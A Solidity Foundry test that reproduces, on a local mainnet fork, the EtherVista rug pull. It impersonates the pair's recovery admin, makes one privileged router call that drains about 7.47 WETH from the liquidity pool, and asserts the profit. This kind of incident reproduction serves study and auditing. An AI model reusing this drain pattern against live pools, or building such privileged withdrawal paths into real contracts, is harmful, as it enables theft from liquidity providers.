// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Run with foundry.toml defaults (fork 26152258):
//   forge test -vvv
// Or explicit:
//   forge test --fork-url https://eth.drpc.org --fork-block-number 26152258 -vvv

import {Test, console} from "forge-std/Test.sol";
import {EtherVistaAddresses} from "./EtherVistaAttack.sol";

interface IERC20View {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EtherVistaAttackTest is Test {

    // ── shorthand ─────────────────────────────────────────────────────────────
    address constant ROUTER         = EtherVistaAddresses.ROUTER;
    address constant WETH           = EtherVistaAddresses.WETH;
    address constant TOKEN          = EtherVistaAddresses.TOKEN;
    address constant PAIR           = EtherVistaAddresses.PAIR;
    address constant RECOVERY_ADMIN = EtherVistaAddresses.RECOVERY_ADMIN;

    // Expected on-chain values at fork block 26152258
    uint256 constant PAIR_WETH_RESERVE_BEFORE = 21_365_578_509_624_935_898;
    // Admin pre-existing token allowance for router at fork block
    uint256 constant ADMIN_TOKEN_ALLOWANCE     = 100;
    // Expected profit from original attack tx (~7.47 WETH)
    uint256 constant EXPECTED_PROFIT_MIN       = 7 ether;
    uint256 constant EXPECTED_PROFIT_MAX       = 8 ether;

    // ── test ──────────────────────────────────────────────────────────────────
    function test_etherVistaRugPull() public {
        // ── sanity: verify fork state ─────────────────────────────────────────
        uint256 pairWethBefore = IERC20View(WETH).balanceOf(PAIR);
        assertEq(
            pairWethBefore,
            PAIR_WETH_RESERVE_BEFORE,
            "unexpected WETH reserve at fork block"
        );

        // Allowance: admin had pre-approved router for 100 tokens at fork block
        uint256 allowanceBefore = IERC20View(TOKEN).allowance(RECOVERY_ADMIN, ROUTER);
        assertEq(
            allowanceBefore,
            ADMIN_TOKEN_ALLOWANCE,
            "unexpected token allowance at fork block"
        );

        // ── BEFORE snapshot ───────────────────────────────────────────────────
        uint256 adminWethBefore  = IERC20View(WETH).balanceOf(RECOVERY_ADMIN);
        uint256 adminTokenBefore = IERC20View(TOKEN).balanceOf(RECOVERY_ADMIN);
        uint256 pairTokenBefore  = IERC20View(TOKEN).balanceOf(PAIR);

        _logState(
            "BEFORE",
            pairWethBefore, pairTokenBefore,
            adminWethBefore, adminTokenBefore
        );

        // ── setup: give admin exactly 1 token ─────────────────────────────────
        // In the original block the admin acquired tokens via prior txs.
        // We replicate with deal() since we fork at the block before.
        deal(TOKEN, RECOVERY_ADMIN, 1);

        // ── EXECUTE ───────────────────────────────────────────────────────────
        // The exploit is a single privileged call by the recovery admin.
        // We impersonate the admin EOA via vm.prank (no flash loan needed).
        uint256 gasBefore = gasleft();
        vm.startPrank(RECOVERY_ADMIN);
        (bool ok, ) = ROUTER.call(
            abi.encodeWithSelector(bytes4(0x5ee3f775), TOKEN, uint256(1))
        );
        vm.stopPrank();
        uint256 gasUsed = gasBefore - gasleft();
        require(ok, "EtherVista: router call reverted");

        // ── AFTER snapshot ────────────────────────────────────────────────────
        uint256 pairWethAfter   = IERC20View(WETH).balanceOf(PAIR);
        uint256 pairTokenAfter  = IERC20View(TOKEN).balanceOf(PAIR);
        uint256 adminWethAfter  = IERC20View(WETH).balanceOf(RECOVERY_ADMIN);
        uint256 adminTokenAfter = IERC20View(TOKEN).balanceOf(RECOVERY_ADMIN);

        uint256 profit = adminWethAfter - adminWethBefore;

        _logState(
            "AFTER",
            pairWethAfter, pairTokenAfter,
            adminWethAfter, adminTokenAfter
        );

        console.log("");
        console.log("=== DELTA ===");
        console.log("pair WETH net change (wei) :",
            pairWethBefore > pairWethAfter ? pairWethBefore - pairWethAfter : 0);
        console.log("admin WETH profit    (wei) :", profit);
        console.log("admin TOKEN received (wei) :", adminTokenAfter > adminTokenBefore
            ? adminTokenAfter - adminTokenBefore : 0);
        console.log("gas used                   :", gasUsed);

        // ── assertions ────────────────────────────────────────────────────────

        // Pair lost WETH (net drain ~7.47 WETH)
        assertLt(pairWethAfter, pairWethBefore, "pair WETH should have decreased");

        // Admin received WETH profit
        assertGt(profit, 0, "no WETH profit");

        // Profit is in expected range
        assertGt(profit, EXPECTED_PROFIT_MIN, "profit unexpectedly low");
        assertLt(profit, EXPECTED_PROFIT_MAX, "profit unexpectedly high");
    }

    // ── helper ────────────────────────────────────────────────────────────────
    function _logState(
        string memory label,
        uint256 pairWeth,
        uint256 pairToken,
        uint256 adminWeth,
        uint256 adminToken
    ) internal pure {
        console.log("");
        console.log(string.concat("=== ", label, " ==="));
        console.log("pair  WETH  balance (wei) :", pairWeth);
        console.log("pair  TOKEN balance (wei) :", pairToken);
        console.log("admin WETH  balance (wei) :", adminWeth);
        console.log("admin TOKEN balance (wei) :", adminToken);
    }
}
